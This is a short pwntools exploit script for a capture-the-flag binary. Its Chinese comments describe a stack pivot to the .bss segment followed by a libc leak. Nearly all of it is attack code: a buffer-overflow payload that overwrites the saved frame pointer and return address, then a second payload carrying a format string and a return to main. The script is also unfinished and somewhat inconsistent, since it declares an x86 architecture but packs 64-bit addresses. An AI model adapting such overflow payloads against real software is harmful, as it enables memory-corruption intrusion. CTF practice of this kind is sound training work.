from pwn import *

context.log_level = 'debug'
context.endian = 'little'
context.arch = 'x86'

libc = ELF('libc.so.6')
p = process('./chall')
# p = remote('127.0.0.1',61234)

# 先做一步栈迁移, 迁移到bss段
# 再向栈上写入内容, 使用gadget输出libc(edi? puts?)

bss_addr = 0x404040
vuln_in_main_addr = 0x401212
leave_ret_addr = 0x4011E5
write_rbp_plus_0x20_addr = 0x4011C9
format_string_addr = 0x402008

# 做栈迁移
payload1 = b'a'*0x20
payload1 += p64(bss_addr+0x20)

payload1 += p64(write_rbp_plus_0x20_addr)
# 这样栈迁移之后
p.recvuntil(b': ')

print('pid'+str(proc.pidof(p)))
pause()

p.send(payload1)

payload2 = b''
payload2 += b'a'*0x20
payload2 += b'%s%s%s%s'
payload2 += p64(vuln_in_main_addr)
p.send(payload2)

p.interactive()